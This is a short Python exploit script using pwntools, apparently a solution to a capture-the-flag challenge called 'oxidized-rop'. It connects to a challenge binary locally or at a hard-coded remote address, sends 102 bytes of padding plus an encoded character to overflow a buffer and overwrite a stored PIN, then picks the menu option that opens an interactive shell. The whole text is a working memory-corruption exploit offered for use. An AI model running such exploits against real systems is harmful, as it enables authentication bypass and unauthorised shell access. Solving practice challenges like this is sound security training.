#!/usr/bin/env python3

from pwn import *

exe = ELF("./oxidized-rop")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.253.251", 45349)

    return r


def main():
    r = conn()

    # In Rust, a characters uses 4 bytes (unicode rapresentation)
    padding = b"A" * 102
    pin = 123456

    # Change the PIN (saved at $rsp+0x1a8) and get access to the shell
    r.sendlineafter(b"Selection: ", b"1")
    r.sendlineafter(b"): ", padding + chr(pin).encode("utf-8"))

    r.sendlineafter(b"Selection: ", b"2")
    r.interactive("$ ")


if __name__ == "__main__":
    main()
